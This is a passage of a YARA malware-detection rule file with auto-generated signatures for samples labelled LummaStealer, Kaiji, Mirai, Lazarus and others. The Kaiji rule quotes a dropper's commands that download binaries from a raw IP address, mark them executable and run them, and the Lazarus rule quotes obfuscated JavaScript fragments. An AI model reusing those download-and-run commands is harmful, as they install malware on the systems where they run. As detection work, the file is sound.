      uint16(0) == 0x4b50 and filesize < 26000KB and
      8 of them
}

rule Mirai_signature__1b112733 {
   meta:
      description = "_subset_batch - file Mirai(signature)_1b112733.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1b11273357a098554b17075871ba7ec20c135f9f1d8a051362a7be2d6a5dce45"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Kaiji_signature_ {
   meta:
      description = "_subset_batch - file Kaiji(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1a64321f8e6e0c5b242921d211b4b04c2161b5af45818e95936235319742aca0"
   strings:
      $s1 = "rm -f linux_aarch64;wget http://68.69.184.110:8000/linux_aarch64||curl http://68.69.184.110:8000/linux_aarch64 > linux_aarch64||" ascii /* score: '28.00'*/
      $s2 = "rm -f linux_arm5;wget http://68.69.184.110:8000/linux_arm5||curl http://68.69.184.110:8000/linux_arm5 > linux_arm5||busybox wget" ascii /* score: '28.00'*/
      $s3 = "el||busybox wget http://68.69.184.110:8000/linux_mips64el;chmod +x linux_mips64el;./linux_mips64el||rm -f linux_mips64el" fullword ascii /* score: '28.00'*/
      $s4 = "rm -f linux_mipsel;wget http://68.69.184.110:8000/linux_mipsel||curl http://68.69.184.110:8000/linux_mipsel > linux_mipsel||busy" ascii /* score: '28.00'*/
      $s5 = "wget http://68.69.184.110:8000/linux_amd64;chmod +x linux_amd64;./linux_amd64||rm -f linux_amd64" fullword ascii /* score: '28.00'*/
      $s6 = "box wget http://68.69.184.110:8000/linux_mipsel;chmod +x linux_mipsel;./linux_mipsel||rm -f linux_mipsel" fullword ascii /* score: '28.00'*/
      $s7 = "rm -f linux_mips;wget http://68.69.184.110:8000/linux_mips||curl http://68.69.184.110:8000/linux_mips > linux_mips||busybox wget" ascii /* score: '28.00'*/
      $s8 = "rm -f linux_amd64;wget http://68.69.184.110:8000/linux_amd64||curl http://68.69.184.110:8000/linux_amd64 > linux_amd64||busybox " ascii /* score: '28.00'*/
      $s9 = "rm -f linux_arm7;wget http://68.69.184.110:8000/linux_arm7||curl http://68.69.184.110:8000/linux_arm7 > linux_arm7||busybox wget" ascii /* score: '28.00'*/
      $s10 = "rm -f linux_mips64;wget http://68.69.184.110:8000/linux_mips64||curl http://68.69.184.110:8000/linux_mips64 > linux_mips64||busy" ascii /* score: '28.00'*/
      $s11 = "box wget http://68.69.184.110:8000/linux_mips64;chmod +x linux_mips64;./linux_mips64||rm -f linux_mips64" fullword ascii /* score: '28.00'*/
      $s12 = "busybox wget http://68.69.184.110:8000/linux_aarch64;chmod +x linux_aarch64;./linux_aarch64||rm -f linux_aarch64" fullword ascii /* score: '28.00'*/
      $s13 = "rm -f linux_arm6;wget http://68.69.184.110:8000/linux_arm6||curl http://68.69.184.110:8000/linux_arm6 > linux_arm6||busybox wget" ascii /* score: '28.00'*/
      $s14 = "rm -f linux_386;wget http://68.69.184.110:8000/linux_386||curl http://68.69.184.110:8000/linux_386 > linux_386||busybox wget htt" ascii /* score: '28.00'*/
      $s15 = "rm -f linux_mips64el;wget http://68.69.184.110:8000/linux_mips64el||curl http://68.69.184.110:8000/linux_mips64el > linux_mips64" ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 6KB and
      8 of them
}

rule Latrodectus_signature_ {
   meta:
      description = "_subset_batch - file Latrodectus(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c19ca89672cb0268852aee4816837dbc26ffb1f285b5a1ad4b9d26cfe88dd134"
   strings:
      $s1 = "malicious artifact/version.dll" fullword ascii /* score: '23.00'*/
      $s2 = "malicious artifact/wtsapi32.dll" fullword ascii /* score: '20.00'*/
      $s3 = "malicious artifact/igfxSDK.exe" fullword ascii /* score: '19.00'*/
      $s4 = "rsEtE|EjEfEyEuEm" fullword ascii /* score: '9.00'*/
      $s5 = "*  1k*N1^" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__d3b8060c77e25bad949642210b0e3d82_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_d3b8060c77e25bad949642210b0e3d82(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d45a54d3e490add7c0b547f6a6be16b843f9fdf12f1ac8427aa84c3e58aac93f"
   strings:
      $s1 = "(SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s2 = "(registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s3 = "%s\\Contact_Explain.txt" fullword wide /* score: '11.00'*/
      $s4 = "%s\\Contact_Explain Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s5 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
      $s6 = "<6':&:3!{" fullword ascii /* score: '9.00'*/ /* hex encoded string 'c' */
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule LummaStealer_signature__d3b8060c77e25bad949642210b0e3d82_imphash__5ef5de4a {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_d3b8060c77e25bad949642210b0e3d82(imphash)_5ef5de4a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5ef5de4aec30ad3c8ef7a03fb799e4163b86c1fc5fa10733823d5343b80e2ccd"
   strings:
      $s1 = "(SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s2 = "(registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s3 = "%s\\Contact_Explain.txt" fullword wide /* score: '11.00'*/
      $s4 = "%s\\Contact_Explain Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s5 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
      $s6 = "<6':&:3!{" fullword ascii /* score: '9.00'*/ /* hex encoded string 'c' */
      $s7 = "d~p.mSI" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule LummaStealer_signature__87871cba611b733996d43862fa538c72_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_87871cba611b733996d43862fa538c72(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "85333900ee48425c1e50979e3f7ae10fe7cf4299db408cda48846d5e8bf09d10"
   strings:
      $s1 = "(SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s2 = "Operations complete." fullword wide /* score: '12.00'*/
      $s3 = "(registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s4 = "%s\\Contact_Explain.txt" fullword wide /* score: '11.00'*/
      $s5 = "%s\\Contact_Explain Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s6 = "<read failed>" fullword wide /* score: '10.00'*/
      $s7 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule LummaStealer_signature__87871cba611b733996d43862fa538c72_imphash__f35d464b {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_87871cba611b733996d43862fa538c72(imphash)_f35d464b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f35d464bc5aa77e7ead8a392fb214bf9efe5387466ee21f3a4353f813ff8dc4b"
   strings:
      $s1 = "(SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s2 = "Operations complete." fullword wide /* score: '12.00'*/
      $s3 = "(registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s4 = "%s\\Contact_Explain.txt" fullword wide /* score: '11.00'*/
      $s5 = "%s\\Contact_Explain Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s6 = "<read failed>" fullword wide /* score: '10.00'*/
      $s7 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule LummaStealer_signature__69e7957ebc4546ed7a08366d457acaae_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_69e7957ebc4546ed7a08366d457acaae(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "724766e82eb006e53d86fbcc054a39c2ec55f2d13484b21df43de1e4f309ad1c"
   strings:
      $s1 = "mfqgxbv" fullword ascii /* score: '8.00'*/
      $s2 = "BQxP'!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__69e7957ebc4546ed7a08366d457acaae_imphash__0a3cc63c {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_69e7957ebc4546ed7a08366d457acaae(imphash)_0a3cc63c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0a3cc63c616fa98026a4aaef9340d59e39f038081cf55560d696cc4258d6de04"
   strings:
      $s1 = "mfqgxbv" fullword ascii /* score: '8.00'*/
      $s2 = "BQxP'!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__69e7957ebc4546ed7a08366d457acaae_imphash__23069ffb {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_69e7957ebc4546ed7a08366d457acaae(imphash)_23069ffb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "23069ffbef1a9bae5cb7883b0e56547cdf43e1acdbc7e96d415bb78200c4cd70"
   strings:
      $s1 = "mfqgxbv" fullword ascii /* score: '8.00'*/
      $s2 = "BQxP'!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__69e7957ebc4546ed7a08366d457acaae_imphash__647a8901 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_69e7957ebc4546ed7a08366d457acaae(imphash)_647a8901.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "647a8901c3c62add53d7a4d4af1b5a0503355724a276a8d54d77a52dbb8d9714"
   strings:
      $s1 = "mfqgxbv" fullword ascii /* score: '8.00'*/
      $s2 = "BQxP'!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__69e7957ebc4546ed7a08366d457acaae_imphash__baa3b74c {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_69e7957ebc4546ed7a08366d457acaae(imphash)_baa3b74c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "baa3b74c93fa2cfb0f1d659e4a014bff80e4d653d98ebedad852dbd0145ecb13"
   strings:
      $s1 = "mfqgxbv" fullword ascii /* score: '8.00'*/
      $s2 = "BQxP'!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__da81261259e99bfaae1a58c0222953dc_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_da81261259e99bfaae1a58c0222953dc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "61e3418b02d835bd161fa575ba60ddbb12f07ebf906ca17eae633ec431244023"
   strings:
      $s1 = "bKERNEL32.DLL" fullword wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__da81261259e99bfaae1a58c0222953dc_imphash__7ead82ce {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_da81261259e99bfaae1a58c0222953dc(imphash)_7ead82ce.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7ead82ce70c57933a2d02fc683eb1e4de5bdaef6eb44dd26ee387a54a81f73d4"
   strings:
      $s1 = "bKERNEL32.DLL" fullword wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__da81261259e99bfaae1a58c0222953dc_imphash__e3356215 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_da81261259e99bfaae1a58c0222953dc(imphash)_e3356215.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e3356215981ea7908f0c10e174a8d93db48492f5e9ee0242d416ac8e3d81421f"
   strings:
      $s1 = "bKERNEL32.DLL" fullword wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Lazarus_signature_ {
   meta:
      description = "_subset_batch - file Lazarus(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2ddef03b28d0a898637b2fe1c6a325db66bc306c1b6acded9df5a5583e57e106"
   strings:
      $s1 = "    const _0x56797b = ['6ynt', '0d8dtj552q', 'Tumqs9jBcv', 'CZKkU', 'VuiPa', 'D6F68C0710', 'IOjJb', 'getRespons', 'LK2ds9JNq1', " ascii /* score: '24.00'*/
      $s2 = "typeof window != _0x112fa8(0x63c) && typeof window[_0x112fa8(0x174)] != _0x112fa8(0x63c) ? checkethereumw() : rund != -0xbad * -" ascii /* score: '18.00'*/
      $s3 = "c)](runmask), _0x3f2304[_0x4e9bf4(0x393)](rund, 0x11 * 0x1b3 + -0xeae + -0xe34) && (rund = -0x890 + 0xf27 + -0x696, neth = -0x17" ascii /* score: '18.00'*/
      $s4 = "0xf48 + -0x1d5 * -0xa) && (rund = 0x73c + 0x6 * 0x24c + -0x1503, _0x3f2304[_0x4e9bf4(0x6ec)](newdlocal));" fullword ascii /* score: '17.00'*/
      $s5 = "typeof window != _0x112fa8(0x63c) && typeof window[_0x112fa8(0x174)] != _0x112fa8(0x63c) ? checkethereumw() : rund != -0xbad * -" ascii /* score: '17.00'*/
      $s6 = "0x1 + -0xb0f + 0x1 * -0x9d && (rund = -0x1210 + -0x2d1 + 0x14e2, newdlocal());" fullword ascii /* score: '17.00'*/
      $s7 = "&& _0xba16ef[_0x29ad9a(0x791)](neth, 0x2 * -0x1083 + 0x1 * 0x1095 + 0x1071 * 0x1) && (_0x530d91 = _0x530d91[_0x29ad9a(0x4a0)](_0" ascii /* score: '15.00'*/
      $s8 = " * -0x18a + 0x1 * -0xf3 + -0x2272, _0x3f2304[_0x4e9bf4(0x6ec)](newdlocal))) : _0x3f2304[_0x4e9bf4(0x393)](rund, -0x25 * 0x15 + -" ascii /* score: '14.00'*/
      $s9 = "* -0x81e + -0x35e * 0x5)," fullword ascii /* score: '13.00'*/
      $s10 = "        _0x3f2304[_0x4e9bf4(0x393)](rund, -0x127f + -0xae2 * 0x3 + 0x3326) && (rund = -0x29 * 0xee + 0x8bc + 0x1d63 * 0x1, _0x3f" ascii /* score: '13.00'*/
      $s11 = "var neth = 0x5c6 * 0x2 + 0x23c4 + -0x2f50," fullword ascii /* score: '12.00'*/
      $s12 = "(_0x15b386(0x435)) / (0xeb5 + 0x3b1 + -0x125e) * (parseInt(_0x15b386(0x56e)) / (0x18 * 0x118 + -0x17ee + -0x249)) + parseInt(_0x" ascii /* score: '12.00'*/
      $s13 = "        _0x3f2304[_0x4e9bf4(0x2b0)](_0x124ed3[_0x4e9bf4(0x266)], -0x2 * 0x1f + 0xa31 + 0x11b * -0x9) ? (_0x3f2304[_0x4e9bf4(0x6e" ascii /* score: '12.00'*/
      $s14 = "7f + -0x151)] : _0x50715b[_0x5aba31][_0x22e9c0] = _0xba16ef[_0x3fa8b4(0x4c5)](0x17b1 * 0x1 + -0x222d + 0x219 * 0x5, Math[_0x3fa8" ascii /* score: '12.00'*/
      $s15 = "        _0x3f2304[_0x4e9bf4(0x393)](rund, -0x127f + -0xae2 * 0x3 + 0x3326) && (rund = -0x29 * 0xee + 0x8bc + 0x1d63 * 0x1, _0x3f" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x6f63 and filesize < 300KB and
      8 of them
}

rule MetaStealer_signature__513992d7 {
   meta:
      description = "_subset_batch - file MetaStealer(signature)_513992d7.cab"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "513992d7076984d5c5a42affc12b6a00eef820f3254af75c9958ef3310190317"
   strings:
      $s1 = "ls26.exe" fullword ascii /* score: '19.00'*/
      $s2 = "yUyUyUyUyUyU" fullword ascii /* base64 encoded string 'S%2S%2S%' */ /* score: '14.00'*/
      $s3 = "KCit.Opi>Y5l" fullword ascii /* score: '10.00'*/
      $s4 = "iRct.e4" fullword ascii /* score: '9.00'*/
      $s5 = "wwwwwwwwwwwwwwwwwwwwvw" fullword ascii /* score: '8.00'*/
      $s6 = "wwwwwwwwqwwwwwwwwwwwwwww" fullword ascii /* score: '8.00'*/
      $s7 = "wwwwwwwwwwwwwwwwwqwwwwww" fullword ascii /* score: '8.00'*/
      $s8 = "wwwwwwbw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x534d and filesize < 17000KB and
      all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__ca8cf8aa {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_ca8cf8aa.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ca8cf8aa0bab28b391de182e61cf7f9e8f8464717ab971384b73db628aef7267"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.96.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "78-!)%---#" fullword ascii /* score: '9.00'*/ /* hex encoded string 'x' */
      $s4 = "* oG4Y" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__5bfa9685 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_5bfa9685.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5bfa96855a6a849b94532e4209a33c60065cace3f79f5846a91a93987d2d2ac9"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.22.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* 0(8$t51,|" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__90b230c7 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_90b230c7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "90b230c7b8c4991a8f657bc8031157a9070c24eb3de9cd074241985dc99489c0"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v7.74.1-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = ";\\6'\\63\\6" fullword ascii /* score: '9.00'*/ /* hex encoded string 'f6' */
      $s4 = "2@a\"\\\\" fullword ascii /* score: '9.00'*/ /* hex encoded string '*' */
      $s5 = "5if#X* -T" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__c7f881de {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_c7f881de.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c7f881debe7f6186cffbd04858766dfebac68f73f99444718932e47a0968d325"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v3.96.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* xz{0i" fullword ascii /* score: '9.00'*/
      $s4 = "d2PZftpya" fullword ascii /* score: '9.00'*/
      $s5 = "bhighdic" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__d8f2f382 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_d8f2f382.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d8f2f382799b8a7fcd7740d7e5070338cb9da595f7b3f85cae6d216af1836c9d"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v9.33.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "599fa3e078b1cf240f0513969cdc3a5016ffb60c1feae9e574ab8a275ae8e891"
   strings:
      $s1 = "kcincckn" fullword ascii /* score: '8.00'*/
      $s2 = "mhpmhgkc" fullword ascii /* score: '8.00'*/
      $s3 = "SLGJ- ~" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__5b2b5bad {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_5b2b5bad.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5b2b5badb13a879920ecca67f9b31e53fc3226acdedec5b4e311650414d24f35"
   strings:
      $s1 = "AT000102030405060708091011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162" ascii /* score: '9.00'*/
      $s2 = "goyfuzsn" fullword ascii /* score: '8.00'*/
      $s3 = "lbgjeuqh" fullword ascii /* score: '8.00'*/
      $s4 = "QBKd[* " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__b9a40d1f {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_b9a40d1f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b9a40d1f0aeeea140849d211ab77ab355adaa6aa1775e9a7bb4409c36c3d25ee"
   strings:
      $s1 = "bpQS.VWy" fullword ascii /* score: '10.00'*/
      $s2 = "saauglfh" fullword ascii /* score: '8.00'*/
      $s3 = "ujxqegow" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__ff647447 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_ff647447.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ff647447f9f0465fcf317aa3495fab14f3524781b5e35d815432b8305153b995"
   strings:
      $s1 = "WAaweI:\"" fullword ascii /* score: '10.00'*/
      $s2 = "AT000102030405060708091011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162" ascii /* score: '9.00'*/
      $s3 = "EYEgGJv" fullword ascii /* score: '9.00'*/
      $s4 = "hfmiukgo" fullword ascii /* score: '8.00'*/
      $s5 = "iclahjig" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__99daaf3e {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_99daaf3e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "99daaf3eb084bae1a5f419b0ae649f2483a23533171ee51f2c7246685527d2e8"
   strings:
      $s1 = "TdKr.puD" fullword ascii /* score: '10.00'*/
      $s2 = "* X}P<" fullword ascii /* score: '9.00'*/
      $s3 = "\"||+@(3d&" fullword ascii /* score: '9.00'*/ /* hex encoded string '=' */
      $s4 = "jpyqafrz" fullword ascii /* score: '8.00'*/
      $s5 = "erfcvzhr" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__0b3d7bd9 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_0b3d7bd9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0b3d7bd949969024e209b857c76fe6a809a2dc9f0f27075186a2d121ba97c11c"
   strings:
      $s1 = "dkkdlold" fullword ascii /* score: '8.00'*/
      $s2 = "mjwvapzy" fullword ascii /* score: '8.00'*/
      $s3 = "LnHd+ '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__dc484a7a {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_dc484a7a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dc484a7a055302543ed2d5d4a5b7c658a84e605ffb98ce704d434200a2064d2f"
   strings:
      $s1 = "TXPn-->KV" fullword ascii /* score: '9.00'*/
      $s2 = "* N-0[" fullword ascii /* score: '9.00'*/
      $s3 = "ntuqjnes" fullword ascii /* score: '8.00'*/
      $s4 = "jbwnaydx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__25f30ae9 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_25f30ae9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "25f30ae936c4d90390c53e55c4f6d4190181672ca491363720c4a40d5031ac5e"
   strings:
      $s1 = "gstablia" fullword ascii /* score: '8.00'*/
      $s2 = "ezqxtisj" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__a00bd4f1 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_a00bd4f1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a00bd4f19a4566505b8b0ea5c3131b4dec61014086e6683bafa834204462961f"
   strings:
      $s1 = "ibCU:\"" fullword ascii /* score: '10.00'*/
      $s2 = "UYHM:\\" fullword ascii /* score: '10.00'*/
      $s3 = "6B%* -" fullword ascii /* score: '9.00'*/
      $s4 = "kqtwrbvk" fullword ascii /* score: '8.00'*/
      $s5 = "skkxotgo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__2be5b104 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_2be5b104.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2be5b104a63deb6addd9d49ffea10cfbefc8c214c2578f4554b6272ca3856899"
   strings:
      $s1 = "AT000102030405060708091011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162" ascii /* score: '9.00'*/
      $s2 = "qyzswhhx" fullword ascii /* score: '8.00'*/
      $s3 = "jjppzcdw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

